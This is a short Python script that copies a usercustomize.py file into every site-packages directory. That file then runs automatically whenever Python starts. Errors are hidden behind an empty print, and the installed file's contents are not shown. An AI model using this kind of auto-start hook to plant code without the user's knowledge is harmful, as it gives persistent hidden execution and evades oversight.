import os
import site
import shutil

def install_usercustomize():
    paths = site.getsitepackages() if hasattr(site, 'getsitepackages') else [site.getusersitepackages()]
    src = os.path.join(os.path.dirname(__file__), 'usercustomize.py')

    for p in paths:
        try:
            shutil.copy(src, os.path.join(p, 'usercustomize.py'))            
        except Exception as e:
            print()

if __name__ == "__main__":
    install_usercustomize()